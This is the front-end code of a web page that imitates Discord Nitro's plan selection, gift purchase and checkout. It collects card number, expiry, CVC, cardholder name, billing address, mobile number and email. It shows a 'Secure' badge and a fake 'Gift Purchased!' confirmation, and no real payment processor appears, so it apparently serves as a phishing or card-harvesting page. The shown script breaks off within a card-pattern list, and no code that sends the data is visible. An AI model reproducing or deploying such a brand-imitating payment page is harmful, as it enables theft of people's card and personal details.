<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Select Plan ‚Äì Nitro</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root{
  --bg:#0d0e13;
  --modal:#1a1b1e;
  --input:#1e1f22;
  --accent:#5865f2;
  --green:#00c56d;
  --red:#ff3b3b;
  --muted:#ccc;
}
* {
  box-sizing: border-box;
}
body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: "gg sans", Arial, sans-serif;
  color: #fff;
  padding: 20px;
  /* ‚úÖ Fixed Background Image + Dark Overlay */
  background: 
    linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),  /* dark overlay */
    url('https://iili.io/KbTEPdg.png') no-repeat center center fixed;
  background-size: cover;
  background-attachment: fixed; /* stays still even when scrolling */
  background-repeat: no-repeat;
  background-position: center center;
}




/* ============================
   GLOBAL MODAL (NORMAL SETTINGS)
   ‚Äî Hindi na maaapektuhan
============================ */
.modal, .gift-modal { background: var(--modal); width: 100%; max-width: 430px; border: 1px solid #2c2c30; border-radius: 12px; padding: 24px; box-shadow: 0 0 30px rgba(0,0,0,0.6); display: none; flex-direction: column; position: relative; }

#planModal { display: flex; padding-top: 5px !important; padding-left: 15px !important; padding-right: 15px !important; padding-bottom: 0px !important; }

.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }

.modal-header h2 { margin: 0; font-size: 18px; font-weight: 600; }

.close-btn { color:#999; cursor:pointer; font-size:20px; }

.close-btn:hover { color:white; }


/* PLAN CARD */
.plan-card{position:relative;border:1px solid #2c2c30;border-radius:12px;padding:18px;margin-bottom:16px;background:linear-gradient(160deg,#3a1c73,#2c2d34 70%);min-height:317px;display:flex;flex-direction:column;transition:box-shadow .3s ease,transform .2s ease;cursor:pointer;}

.plan-card:hover{box-shadow:0 0 20px rgba(130,130,255,.35);transform:scale(1.03);}

.plan-card::before{content:"";position:absolute;inset:0;background:rgba(15,15,25,.65);border-radius:12px;z-index:0;}

.plan-card *{position:relative;z-index:2;}

.discount-badge{position:absolute;top:-15px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#2e1b4e,#3f3788);color:#d3d3d3;font-weight:bold;font-size:12px;padding:7px 10px;border-radius:15px;box-shadow:0 4px 8px rgba(0,0,0,.3);border:1px solid #2c2c30;}

.plan-title{font-size:34px;font-weight:800;font-style:italic;margin-bottom:6px;}

.price{font-size:30px;font-weight:700;}

.price small{font-size:11px;opacity:.8;margin-left:3px;font-weight:600;}

.year-price{font-size:15px;color:var(--muted);margin-bottom:8px;border-bottom:1px solid rgba(255,255,255,.2);padding-bottom:8px;}

.year-price small{font-size:11px;opacity:.8;margin-left:3px;font-weight:600;}

ul.features{list-style:none;padding:0;margin:16px 0 0 0;}

ul.features li{display:flex;align-items:center;font-size:14px;margin:6px 0;color:#ddd;}

ul.features i{width:20px;margin-right:8px;color:#b2bdfc;}

.nitro-mascot{position:absolute;top:20px;right:15px;width:clamp(150px,28vw,220px);pointer-events:none;z-index:5;}




/* ===== GIFT MODAL ===== */ 
.gift-modal { max-width:780px; display:none; flex-direction:row; }

.gift-flex{display:flex;flex-wrap:wrap;}

.modal-left { background:var(--modal); width:50%; padding:20px 20px 10px; display:flex; flex-direction:column; justify-content:space-between; align-items:center; }


/* üî• FIX: Para hindi lumampas sa CP (mobile gift modal) */
@media (max-width:768px){
  .gift-modal .modal-left {
    width:100%;
    max-width:340px;  /* adjust kung gusto mo mas maliit */
    margin:0 auto;
    padding:16px;
  }
}

.modal-left img { width:90%; border-radius:10px; animation:float 4s ease-in-out infinite; }

@keyframes float { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }

.back-btn { background:none; border:none; color:#b5b5b5; font-size:15px; cursor:pointer; transition:color 0.2s; }

.back-btn:hover { color:white; }

.modal-right { width:50%; padding:30px 35px; display:flex; flex-direction:column; justify-content:space-between; }

.gift-options p { color:var(--muted); font-weight:600; margin-bottom:8px; }

.option { background:var(--modal); border:1px solid #3d3d42; border-radius:10px; padding:15px; margin-bottom:12px; cursor:pointer; transition:0.2s; }

.option.active, .option:hover { border-color:var(--accent); background:#2e3040; border-width:2px; }

.option-header { display:flex; justify-content:space-between; align-items:center; }

.option-title { font-weight:700; font-size:15px; }

.save-tag { background:#3ba55c; color:white; font-size:11px; padding:2px 6px; border-radius:5px; margin-left:5px; }

.note { font-size:13px; color:#aaa; margin-top:15px; }

.note a { color:#00aff4; text-decoration:none; }

.note a:hover { text-decoration:underline; }

.select-btn { background:var(--accent); border:none; color:white; padding:10px 22px; border-radius:8px; font-weight:600; cursor:pointer; }

.select-btn:hover { background:#4752c4; }

.gift-modal .price{font-size:15px!important;font-weight:700;}

.gift-modal .price small{font-size:9px!important;opacity:.8;margin-left:3px;font-weight:600;}

.gift-modal .year-price{font-size:12px!important;color:var(--muted);margin-bottom:8px;border-bottom:1px solid rgba(255,255,255,.2);padding-bottom:8px;}

.gift-modal .year-price small{font-size:9px!important;opacity:.8;margin-left:3px;font-weight:600;}

.back-btn.footer { display:inline-block; margin:0; color:#bbb; font-size:15px; cursor:pointer; padding:10px 20px; border-radius:8px; border:1px solid transparent; transition:all 0.2s ease; }

.back-btn.footer:hover { color:white; border-color:var(--accent); background:rgba(88,101,242,0.1); }



/* ===== PAYMENT SELECTION MODAL ===== */
#selectModal .option{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px 16px;font-size:16px;background:#5865F2;border:2px solid #5865F2;border-radius:10px;color:#fff;cursor:pointer;transform:scale(1);transition:all .25s ease;}

#selectModal .option.active{background:#3c47be;border:2px solid #3c47be;transform:scale(1.05);}

/* Icon styling */
#selectModal .option i{font-size:20px;}

#selectModal .option.active i{color:#fff;}

/* Hover effect */
#selectModal .option:hover{background:#4a57c1;transform:scale(1.03);}





/* ======= CARD INPUT + BILLING ‚Äî FINAL UPDATED VERSION ===== */

#paymentModal,
.billing-section {
  padding-top: 12px !important;
  padding-left: 12px !important;
  padding-right: 12px !important;
  padding-bottom: 12px !important;
}

.input-group{margin-bottom:14px;}

.label-row{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px;gap:8px;}

.label-row .label{font-size:14px;color:var(--muted);}

/* ==== CARD ICONS ==== */
.card-icons{display:flex;flex-wrap:wrap;gap:8px;align-items:center;max-width:100%;overflow:hidden;}

.card-icons img{height:20px;max-width:50px;object-fit:contain;flex-shrink:1;}

/* ==== Card Number Box ==== */
.card-number-box{background:var(--input);border:1px solid #3d3d42;border-radius:10px;padding:8px 10px;display:flex;align-items:center;gap:12px;transition:border-color .25s ease;}

.card-left{display:flex;align-items:center;gap:10px;flex:1;}

.card-icon{width:36px;flex-shrink:0;}

.input{background:transparent;border:0;color:#fff;font-size:14px;outline:none;width:100%;padding:6px 0;}

.autofill-btn{background:#07160a;color:var(--green);border:1px solid var(--green);padding:6px 10px;border-radius:6px;font-weight:700;font-size:13px;cursor:pointer;}

.autofill-btn:hover{background:var(--green);color:#08120a;}


/* ====================================== MM/YY + CVC ‚Äî ONE-LINE STYLE ========================= */
.small-row{display:flex;flex-direction:row;gap:18px;width:100%;}

.small-row .small{flex:1;min-width:0;}

.small-row input{width:100%;box-sizing:border-box;}

.small label{color:var(--muted);font-size:13px;}

.small input{background:var(--input);border:1px solid #3d3d42;border-radius:10px;padding:10px;color:#fff;font-size:14px;transition:border-color .25s ease;}

.full{margin-top:12px;display:flex;flex-direction:column;gap:6px;}

.full label{color:var(--muted);font-size:13px;}

.full input{background:var(--input);border:1px solid #3d3d42;border-radius:10px;padding:10px;color:#fff;font-size:14px;transition:border-color .25s ease;}

.card-number-box:focus-within,.small input:focus,.full input:focus{border-color:var(--accent);outline:none;}

.form-control:focus,.mobile-input:focus{border-color:var(--accent);outline:none;}

.error{border-color:var(--red)!important;}

/* error text: hindi maseselect / mako-copy */
/* üî¥ Error Text (merged version) */
.error-text {
  user-select: none;              /* para hindi makopya */
  -webkit-user-select: none;      /* Safari / Chrome */
  -moz-user-select: none;         /* Firefox */
  -ms-user-select: none;          /* IE / Edge */
  pointer-events: none;           /* hindi clickable */
  color: var(--red);              /* consistent theme red */
  font-size: 14px;
  margin-top: 4px;
  line-height: 1.3;
  display: flex;
  align-items: center;
  gap: 6px;
}

/* üîò Bilog na "!" icon sa unahan */
.error-text::before {
  content: '';
  width: 16px;
  height: 16px;
  background: url("data:image/svg+xml;utf8,<svg fill='%23ff6b6b' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='10' fill='none' stroke='%23ff6b6b' stroke-width='2'/><line x1='12' y1='8' x2='12' y2='12' stroke='%23ff6b6b' stroke-width='2'/><circle cx='12' cy='16' r='1.2' fill='%23ff6b6b'/></svg>") no-repeat center;
  background-size: contain;
}



/* ======================================Billing========================= */
.billing-section{margin-top:20px;background:var(--input);border:1px solid #2c2c30;border-radius:10px;padding:16px;position:relative;}

.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:calc(100% + 32px);margin-left:-16px;margin-right:-16px;padding:0 16px;box-sizing:border-box;}

.billing-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}

.billing-header h3{font-size:15px;margin:0;color:#fff;}

.payment-modal,.modal,.select-modal{overflow:visible!important;position:relative;z-index:999;}

.country-select{margin-right:0;position:relative;display:flex;align-items:center;gap:6px;background:#1b1c1f;border:1px solid #3d3d42;padding:8px 12px;border-radius:8px;width:85px;overflow:visible!important;z-index:9999;}

.country-select img{width:34px;height:20px;}

.country-select select{position:absolute;inset:0;opacity:0;cursor:pointer;z-index:10000;direction:rtl;}

.country-select option{direction:ltr;}

.country-select::after{content:"";position:absolute;right:12px;top:50%;transform:translateY(-50%);pointer-events:none;width:0;height:0;border-left:5px solid transparent;border-right:5px solid transparent;border-top:6px solid #ffffffc7;}

.form-control{background:#1b1c1f;border:1px solid #3d3d42;border-radius:10px;padding:10px;color:#fff;font-size:14px;width:100%;transition:border-color .25s ease;}

.single{grid-column:span 2;}

.mobile-group{display:flex;align-items:center;background:#1b1c1f;border:1px solid #3d3d42;border-radius:10px;overflow:hidden;transition:border-color .25s ease;}

.mobile-dial{padding:10px 12px;color:var(--muted);white-space:nowrap;font-size:14px;border-right:1px solid #25262a;}

.mobile-input{flex:1;padding:10px;border:none;background:transparent;color:#fff;font-size:14px;outline:none;}

.mobile-group:focus-within{border-color:var(--accent);}

option{background:#1e1f22;color:#fff;}

.footer{display:flex;justify-content:space-between;align-items:center;margin-top:18px;}

.back{color:#bbb;cursor:pointer;}

.secure{color:#bbb;display:flex;align-items:center;gap:8px;font-size:13px;}

.next{background:var(--accent);border:none;color:#fff;padding:9px 16px;border-radius:8px;font-weight:700;cursor:pointer;}




/* ===== SUCCESS MODAL ===== */
.success-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:999;}
.success-content{background:var(--modal);padding:30px 40px;border-radius:12px;text-align:center;color:#fff;box-shadow:0 0 30px rgba(0,0,0,0.6);}
.success-content h2{font-size:20px;margin-bottom:10px;color:var(--green);}
.success-content p{font-size:15px;color:var(--muted);margin-bottom:20px;}
.success-content button{background:var(--accent);border:none;padding:8px 20px;color:#fff;font-weight:600;border-radius:6px;cursor:pointer;}

/* Enabled state */
#payment-next.btn-enabled{background-color:#5865F2;color:#fff;border-radius:8px;cursor:pointer;pointer-events:auto;transition:all .25s ease;}
#payment-next.btn-enabled:hover{background-color:#4752c4;}

/* Disabled state */
#payment-next.btn-disabled{background-color:#5865F2;color:#fff;cursor:not-allowed;pointer-events:none;border-radius:8px;opacity:.5;box-shadow:none;}






/* 8Ô∏è‚É£ Tablet landscape */
@media (max-width:1024px) {
  .gift-flex { flex-direction:column; }
  .modal-left, .modal-right { width:100%; padding:20px; }
}

/* üîü Large mobile / phablet */
@media (max-width:768px) {
  .footer { flex-direction:column; gap:12px; }
}

/* ==========================
   üì± MOBILE FIX (Select Gift)
   ========================== */
@media (max-width: 600px) {

  .gift-modal {
    flex-direction: column !important;
    max-width: 100% !important;
    padding: 0 !important;
  }

  .modal-left,
  .modal-right {
    width: 100% !important;
    padding: 20px 20px !important;
  }

  .modal-left img {
    width: 100% !important;
    max-width: 260px;
    margin: 0 auto;
    display: block;
  }

  .option {
    width: 100% !important;
    padding: 14px !important;
  }

  .gift-modal .price { font-size: 18px !important; }
  .gift-modal .year-price { font-size: 13px !important; }
}


/* 1Ô∏è‚É£4Ô∏è‚É£ Small phones */
@media (max-width:500px) {

  /* Keep buttons in one line, same as desktop */
  .footer {
    flex-direction: row !important;
    justify-content: space-between !important;
    align-items: center !important;
    width: 100%;
  }

  /* Button sizing for small screen */
  .footer button {
    padding: 10px 14px;
    font-size: 14px;
  }
}

/* Small phone adjustments for card icons */
@media (max-width: 480px) {
  .card-icons img {
    height: 16px;
    max-width: 40px;
  }
}





/* 2Ô∏è‚É£0Ô∏è‚É£ Ultra tiny (280px and below) */
/* üì± Ultra tiny screens (‚â§ 280px width) */
@media (max-width: 280px) {
  body {
    padding: 4px;
  }

  .option {
    padding: 8px;
    font-size: 12px;
  }

  .card-icons img {
    height: 16px;
  }

  /* ‚úÖ Huwag fixed min-width ‚Äî gamitin responsive width */
  .small input,
  .full input,
  .card-number-box {
    width: 100%;
    font-size: 12px;
    padding: 6px 8px;
  }
}

</style>

<body>

<!-- üîπ PLAN SELECTION MODAL -->
<div class="modal" id="planModal">
  <h2>Select Plan</h2>

  <div class="plan-card nitro" id="nitroCard">
    <div class="discount-badge">40% DISCOUNT</div>
    <img class="nitro-mascot" src="https://i.imgur.com/bvexFMM.png" alt="Nitro Mascot">
    <div class="plan-header">
      <div class="plan-title"><b><i>NITRO</i></b></div>
      <div class="price">$9.99<small>/month</small></div>
      <div class="year-price">$99.99/year</div>
    </div>
    <ul class="features">
      <li><i class="fa-solid fa-arrow-up-from-bracket"></i>500MB uploads</li>
      <li><i class="fa-regular fa-face-smile"></i>Custom emoji anywhere</li>
      <li><i class="fa-solid fa-wand-magic-sparkles"></i>Unlimited Super Reactions</li>
      <li><i class="fa-solid fa-video"></i>HD video streaming</li>
      <li><i class="fa-solid fa-gem"></i>2 Server Boosts</li>
      <li><i class="fa-regular fa-id-badge"></i>Custom profiles and more!</li>
    </ul>
  </div>

  <div class="plan-card basic" id="basicCard">
    <div class="plan-header">
      <div class="plan-title"><b><i>NITRO BASIC</i></b></div>
      <div class="price">$2.99<small>/month</small></div>
      <div class="year-price">$29.99/year</div>
    </div>
    <ul class="features">
      <li><i class="fa-solid fa-arrow-up-from-bracket"></i>50MB uploads</li>
      <li><i class="fa-regular fa-face-smile"></i>Custom emoji anywhere</li>
      <li><i class="fa-solid fa-wand-magic-sparkles"></i>Unlimited Super Reactions</li>
      <li><i class="fa-regular fa-id-badge"></i>Special Nitro badge on your profile</li>
    </ul>
  </div>
</div>

<!-- üîπ GIFT MODAL -->
<div class="gift-modal" id="giftModal">
  <div class="gift-flex">
    <div class="modal-left">
      <h2>Gift Nitro</h2>
      <img src="https://i.imgur.com/SpGlnjt.png" alt="Nitro Gift">
      <!-- Removed Back button from here -->
    </div>

    <div class="modal-right">
      <div class="gift-options">
        <p>Select gift</p>
        <div class="option active">
          <div class="option-header">
            <div class="option-title">1 year of Nitro <span class="save-tag">SAVE 16%</span></div>
            <div class="price">$99.99</div>
          </div>
          <small>Pay a one time charge of $99.99</small>
        </div>
        <div class="option">
          <div class="option-header">
            <div class="option-title">1 month of Nitro</div>
            <div class="price">$9.99</div>
          </div>
          <small>Pay a one time charge of $9.99</small>
        </div>
        <p class="note">
          <i class="fa-regular fa-circle-question"></i>
          You can also send gifts to your friends from the Shop!
          <a href="#">Check it out.</a>
        </p>
      </div>

      <!-- Footer with Back + Select -->
      <div class="footer">
        <button class="back-btn" id="backToPlans">Back</button>
        <button class="select-btn" id="goToPayment">Select</button>
      </div>
    </div>
  </div>
</div>


<!-- üîπ PAYMENT SELECTION MODAL -->
<div class="modal" id="selectModal">
  <div class="modal-header">
    <h2>Payment Selection</h2>
    <span class="close-btn">&times;</span>
  </div>

  <div class="gift-options">
    <p>Choose your payment method</p>
    
    <!-- Credit/Debit Card -->
    <div class="option active" data-method="card">
      <i class="fa-solid fa-credit-card"></i>
      <span class="option-title">Credit/Debit Card</span>
    </div>

    <!-- PayPal -->
    <div class="option" data-method="paypal">
      <i class="fa-brands fa-paypal"></i>
      <span class="option-title">PayPal</span>
    </div>

    <!-- Crypto -->
    <div class="option" data-method="crypto">
      <i class="fa-solid fa-coins"></i>
      <span class="option-title">Crypto</span>
    </div>

  </div>

  <div class="footer">
    <div class="back">Back</div>
    <button class="select-btn">Next</button>
  </div>
</div>


<!-- üîπ CARD INPUT + BILLING MODAL -->
<div class="modal" id="paymentModal">
  <div class="modal-header">
    <h2>Card Payment & Billing</h2>
    <span class="close-btn">&times;</span>
  </div>

  <!-- Card Number -->
  <div class="input-group">
    <div class="label-row">
      <div class="label">Card Number</div>
      <div class="card-icons">
        <img src="https://i.imgur.com/yhQpTlF.png" alt="visa">
        <img src="https://i.imgur.com/2CXB7Dc.png" alt="mc">
        <img src="https://i.imgur.com/GNiFExC.png" alt="amex">
        <img src="https://i.imgur.com/IxqGInJ.png" alt="discover">
        <img src="https://i.imgur.com/SEVKu9b.png" alt="jcb">
        <img src="https://i.imgur.com/lZaV4yu.png" alt="unionpay">
        <img src="https://i.imgur.com/2gzaHO9.png" alt="maya">
      </div>
    </div>
    <div class="card-number-box">
      <div class="card-left">
        <img class="card-icon" src="https://i.imgur.com/4squKHb.png" alt="card icon">
        <input class="input" type="text" placeholder="Card Number" />
      </div>
      <button class="autofill-btn">Autofill link</button>
    </div>
  </div>

  <div class="small-row">
    <div class="small">
      <label>Expiration Date</label>
      <input type="text" placeholder="MM/YY">
    </div>
    <div class="small">
      <label>CVC</label>
      <input type="text" placeholder="Security Code">
    </div>
  </div>

  <div class="full">
    <label>Name On The Card</label>
    <input id="card-name" type="text" placeholder="Name">
  </div>

  <!-- Billing -->
  <div class="billing-section">
    <div class="billing-header">
      <h3>Billing Address</h3>
      <div class="country-select">
        <img id="flagImg" src="https://flagcdn.com/w20/zw.png" alt="flag">
        <select id="countrySelect">
          <option value="wf" data-flag="https://flagcdn.com/w20/wf.png">Wallis & Futuna</option>
          <option value="eh" data-flag="https://flagcdn.com/w20/eh.png">Western Sahara</option>
          <option value="ye" data-flag="https://flagcdn.com/w20/ye.png">Yemen</option>
          <option value="zm" data-flag="https://flagcdn.com/w20/zm.png">Zambia</option>
          <option value="zw" data-flag="https://flagcdn.com/w20/zw.png">Zimbabwe</option>
        </select>
      </div>
    </div>
    <form id="billingForm" class="form-grid"></form>
  </div>

  <div class="footer">
    <div class="back">Back</div>
    <div style="display:flex;gap:12px;align-items:center;">
      <div class="secure"><i class="fa-solid fa-lock"></i> Secure</div>
      <button id="payment-next" class="next btn-disabled">Next</button>
    </div>
  </div>
</div>

<!-- üîπ SUCCESS MODAL -->
<div class="success-modal" id="successModal">
  <div class="success-content">
    <h2>Gift Purchased!</h2>
    <p>Your Nitro Gift has been successfully purchased!</p>
    <button id="closeSuccess">Close</button>
  </div>
</div>



<script>
/* ==============================
   MODAL ELEMENTS
============================== */
const planModal = document.getElementById('planModal');
const giftModal = document.getElementById('giftModal');
const selectModal = document.getElementById('selectModal');
const paymentModal = document.getElementById('paymentModal');
const successModal = document.getElementById('successModal');

const nitroCard = document.getElementById('nitroCard');
const basicCard = document.getElementById('basicCard');
const backToPlans = document.getElementById('backToPlans');
const goToPayment = document.getElementById('goToPayment');
const giftOptions = document.querySelectorAll('.gift-options .option');

let selectedGift = null;

/* ==============================
   PLAN ‚Üí GIFT MODAL
============================== */
function openGiftModal() {
  planModal.style.display = 'none';
  giftModal.style.display = 'flex';
  giftOptions.forEach(o => o.classList.remove('active'));
  selectedGift = null;
  goToPayment.disabled = true;
  goToPayment.style.opacity = 0.5;
}
[nitroCard, basicCard].forEach(btn => btn.addEventListener('click', openGiftModal));

/* ==============================
   SELECT GIFT OPTION
============================== */
giftOptions.forEach((opt, i) => {
  opt.addEventListener('click', () => {
    giftOptions.forEach(o => o.classList.remove('active'));
    opt.classList.add('active');
    selectedGift = i;
    goToPayment.disabled = false;
    goToPayment.style.opacity = 1;
  });
});

/* ==============================
   BACK TO PLAN
============================== */
backToPlans.addEventListener('click', () => {
  giftModal.style.display = 'none';
  planModal.style.display = 'block';
});

/* ==============================
   GIFT ‚Üí PAYMENT SELECTION
============================== */
goToPayment.addEventListener('click', () => {
  giftModal.style.display = 'none';
  selectModal.style.display = 'flex';
});

/* ==============================
   PAYMENT SELECTION LOGIC
============================== */
const selectBack = selectModal.querySelector('.back');
const selectNext = selectModal.querySelector('.select-btn');
const paymentOptions = selectModal.querySelectorAll('.option');

let selectedPayment = null;

// Function to reset payment selection
function resetSelection() {
  paymentOptions.forEach(o => o.classList.remove('active'));
  selectedPayment = null;
  selectNext.disabled = true;
  selectNext.style.opacity = 0.5;
}

// Initialize state
resetSelection();

// Handle payment option click
paymentOptions.forEach(opt => {
  opt.addEventListener('click', () => {
    resetSelection(); // Clear previous selection
    opt.classList.add('active'); // Activate current
    selectedPayment = opt.dataset.method;
    selectNext.disabled = false;
    selectNext.style.opacity = 1;
  });
});

// Handle Back button
selectBack.addEventListener('click', () => {
  selectModal.style.display = 'none';
  giftModal.style.display = 'flex';
  resetSelection();
});

// Handle Next button
selectNext.addEventListener('click', () => {
  if (!selectedPayment) return; // Extra safety check
  selectModal.style.display = 'none';
  paymentModal.style.display = 'block';
});


/* ==============================
   BACK BUTTON IN PAYMENT MODAL
============================== */
const backToGift = paymentModal.querySelector('.back');
backToGift.addEventListener('click', () => {
  paymentModal.style.display = 'none';
  selectModal.style.display = 'flex';
});

/* ==============================
   COUNTRY BILLING FORM
============================== */
const COUNTRY_FORMS = {
  wf: { dial: "+681", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
  eh: { dial: "+212", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
  ye: { dial: "+967", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
  zm: { dial: "+260", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
  zw: { dial: "+263", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Postal code"],["Mobile"],["Email"]] }
};

const select = document.getElementById('countrySelect');
const flagImg = document.getElementById('flagImg');
const form = document.getElementById('billingForm');

function renderForm(code) {
  const data = COUNTRY_FORMS[code];
  form.innerHTML = '';

  data.fields.forEach(row => {
    if (row.length === 2) {
      row.forEach(f => {
        const div = document.createElement('div');
        let id = f.toLowerCase().replace(/\s+/g, '-');
        if (f === "First name") id = "first-name";
        if (f === "Last name") id = "last-name";
        if (f === "Email") id = "email";
        if (f === "Address line 1") id = "address-line-1";
        if (f === "Address line 2") id = "address-line-2";

        div.innerHTML = `<input type="text" id="${id}" placeholder="${f}" class="form-control">`;
        form.appendChild(div);
      });
    } else {
      const field = row[0];
      const div = document.createElement('div');
      div.classList.add('single');

      if (field === "Mobile") {
        div.innerHTML = `
          <div class="mobile-group">
            <span class="mobile-dial">${data.dial}</span>
            <input type="text" id="mobile" class="mobile-input" placeholder="Mobile number">
          </div>`;
      } else {
        const id = field === "Address line 2"
          ? "address-line-2"
          : field.toLowerCase().replace(/\s+/g, '-');
        div.innerHTML = `<input type="text" id="${id}" placeholder="${field}" class="form-control">`;
      }
      form.appendChild(div);
    }
  });
}

// COUNTRY SELECT CHANGE ‚Üí UPDATE FORM + FLAG
select.addEventListener('change', (e) => {
  const code = e.target.value;
  const selectedOption = e.target.selectedOptions[0];
  if(selectedOption) flagImg.src = selectedOption.dataset.flag;

  renderForm(code);          // i-render ang bagong form
  autoCheckPaymentForm();    // re-check validation
});

renderForm('zw');

/* ==============================
   CARD VALIDATION & FORM
============================== */
const ultimateCardPatterns = [
  // ---------- Global majors ----------
  { type: "visa",         pattern: /^4\d*/,                                            cvcLen:[3], lengths:[13,16,19] },
  { type: "visa_debit",   pattern: /^(4026|417500|4508|4844|4913|4917)\d*/,            cvcLen:[3], lengths:[16] },
  { type: "mastercard",   pattern: /^(5[1-5]\d*|2(2[2-9]|[3-6]\d|7[01]|720)\d*)/,      cvcLen:[3], lengths:[16] },
  { type: "mastercard_debit", pattern: /^(5[0-5]0|5[0-9]{2})\d*/,                      cvcLen:[3], lengths:[16] },
  { type: "amex",         pattern: /^3[47]\d*/,                                        cvcLen:[4], lengths:[15] },
  { type: "discover",     pattern: /^(6011|65|64[4-9]|622(12[6-9]|1[3-9]\d|[2-8]\d{2}|9([0-1]\d|2[0-5])))\d*/, cvcLen:[3], lengths:[16,19] },
  { type: "jcb",          pattern: /^35(2[8-9]|[3-8]\d)\d*/,                           cvcLen:[3], lengths:[16] },
  { type: "diners_club",  pattern: /^3(0[0-5]|[68])\d*/,                               cvcLen:[3], lengths:[14,16] },
  { type: "maestro",      pattern: /^(50|5[6-9]|6\d)\d*/,                              cvcLen:[3], lengths:[12,13,14,15,16,17,18,19] },
  { type: "unionpay",     pattern: /^(62|81)\d*/,                                      cvcLen:[3], lengths:[16,17,18,19] },

  // ---------- Latin America / Brazil ----------
  { type: "elo",          pattern: /^(4011|4312|4389|4514|4576|5041|5067|5090|6277|6362|650\d|651\d|655\d)\d*/, cvcLen:[3], lengths:[16] },
  { type: "hipercard",    pattern: /^(6062|3841)\d*/,                                  cvcLen:[3], lengths:[13,16,19] },
  { type: "hiperbrasil",  pattern: /^(606282|3841)\d*/,                                cvcLen:[3], lengths:[16,19] },
  { type: "banco_do_brasil", pattern: /^504175\d*/,                                    cvcLen:[3], lengths:[16] },
  { type: "santander_br", pattern: /^4556\d*/,                                         cvcLen:[3], lengths:[16] },
  { type: "naranja",      pattern: /^5896\d*/,                                         cvcLen:[3], lengths:[16] },
  { type: "cabal",        pattern: /^(6042|589657|604909|604910|604911)\d*/,           cvcLen:[3], lengths:[16] },
  { type: "banrisul",     pattern: /^5041\d*/,                                         cvcLen:[3], lengths:[16] },

  // ---------- North America / US / Canada ----------
  { type: "discover_diners", pattern: /^(36|38|301)\d*/,                               cvcLen:[3], lengths:[14,16] },
  { type: "visa_us",      pattern: /^4\d{12,18}$/,                                     cvcLen:[3], lengths:[13,16,19] },
  { type: "interac_debit",pattern: /^(4(0|1)|6(0|5))\d*/,                              cvcLen:[3], lengths:[16] },
  { type: "uatp",         pattern: /^1\d{14}$/,                                        cvcLen:[3], lengths:[15] },

  // ---------- Europe regionals ----------
  { type: "bancontact",   pattern: /^(6703|6706|6709|6771)\d*/,                        cvcLen:[3], lengths:[16] },
  { type: "dankort",      pattern: /^5019\d*/,                                         cvcLen:[3], lengths:[16] },
  { type: "girocard",     pattern: /^(67|50)\d*/,                                      cvcLen:[3], lengths:[16,19] },
  { type: "carte_bancaire", pattern: /^(4035|5199|5288|4571)\d*/,                      cvcLen:[3], lengths:[16] },
  { type: "cb_global",    pattern: /^5(2|3)\d*/,                                       cvcLen:[3], lengths:[16] },

  // ---------- Asia regionals ----------
  { type: "rupay",        pattern: /^(60|6521|6522|6523|6524|508)\d*/,                 cvcLen:[3], lengths:[16] },
  { type: "mir",          pattern: /^220[0-4]\d*/,                                    cvcLen:[3], lengths:[16] },
  { type: "troy",         pattern: /^9792\d*/,                                        cvcLen:[3], lengths:[16] },
  { type: "mada",         pattern: /^(588845|588846|588847|6(0|1|4|5|8))\d*/,         cvcLen:[3], lengths:[16] },
  { type: "napas",        pattern: /^9704\d*/,                                        cvcLen:[3], lengths:[16] },
  { type: "china_unionpay", pattern: /^62\d*/,                                        cvcLen:[3], lengths:[16,17,18,19] },

  // ---------- Africa / Nigeria ----------
  { type: "verve",        pattern: /^(506099|506198|650002|650004|5078)\d*/,           cvcLen:[3], lengths:[16,19] },
  { type: "interswitch",  pattern: /^(5061|5062|5063|5058|5078)\d*/,                   cvcLen:[3], lengths:[16] },
  { type: "bc_card",      pattern: /^(5061|5062|5063)\d*/,                             cvcLen:[3], lengths:[16] },

  // ---------- UK / legacy ----------
  { type: "maestro_uk",   pattern: /^(6759|6761|6762|6763)\d*/,                        cvcLen:[3], lengths:[12,13,14,15,16,17,18,19] },
  { type: "switch",       pattern: /^(4903|4905|4911|4936|6333|6759)\d*/,              cvcLen:[3], lengths:[16,18,19] },
  { type: "solo",         pattern: /^(6334|6767)\d*/,                                  cvcLen:[3], lengths:[16,18,19] },
  { type: "laser",        pattern: /^(6304|6706|6771|6709)\d*/,                        cvcLen:[3], lengths:[16,17,18,19] },

  // ---------- Oceania / Australia / NZ ----------
  { type: "eftpos_au",    pattern: /^6(0|4)\d*/,                                      cvcLen:[3], lengths:[16] },
  { type: "nsw_bank",     pattern: /^5(4|5)\d*/,                                      cvcLen:[3], lengths:[16] },

  // ---------- Country/issuer examples ----------
  { type: "bpi_ph",       pattern: /^4\d*/,                                           cvcLen:[3], lengths:[16] },
  { type: "maya_ph",      pattern: /^2(4|7)\d*/,                                      cvcLen:[3], lengths:[16] },
  { type: "banamex",      pattern: /^4\d*/,                                           cvcLen:[3], lengths:[16] },
  { type: "bni_id",       pattern: /^48|49\d*/,                                       cvcLen:[3], lengths:[16] },
  { type: "mandiri",      pattern: /^5(0|2|3)\d*/,                                    cvcLen:[3], lengths:[16] },

];


